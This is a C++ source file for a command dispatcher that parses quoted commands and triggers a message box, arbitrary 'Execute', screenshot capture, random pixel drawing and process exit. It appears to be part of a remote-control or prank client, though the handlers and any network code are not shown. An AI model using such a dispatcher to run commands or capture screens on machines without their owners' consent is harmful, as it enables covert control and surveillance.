#include "CommandHandler.h"

std::vector<std::string> CommandHandler::cleanFunctions(const std::string& input)
{
    std::vector<std::string> result;
    std::istringstream iss(input);
    std::string token;

    while (std::getline(iss, token, '\''))
    {
        if (!token.empty() && token != " ")
        {
            result.push_back(token);
        }
    }

    return result;
}

void CommandHandler::callFunction(const std::vector<std::string>& input)
{
    //std::cout << "DEBUG: " << input[0] << "SPACE\n";
    std::cout << "[+] Called callFunction() with args -> ";
    for(int i = 0; i < input.size(); i++)
    {
        std::cout << input[i] << " ";
    }
    std::cout << "\n";

    if (input[0] == "Message ")
    {
        std::vector<std::string> args = {input[1], input[2]};
        std::thread t(commands::showMessageBox, std::ref(args));
        t.join();
    }

    if (input[0] == "Execute ")
    {
        std::thread t(commands::execute, std::ref(input[1]));
        t.join();
    }

    if (input[0] == "Cringe ")
    {
        std::thread t(commands::cringe);
        t.join();
    }

    if (input[0] == "screentest ")
    {
        std::thread t(commands::Screenshot_C);
        t.join();
    }
    
    if(input[0] == "randomPixel ")
    {
        std::thread t(commands::randomPixel, std::stoi(input[1]), std::stoi(input[2]), 50);
        t.join();
    }

    if(input[0] == "Exit ")
    {
        commands::StopProcess();
    }
}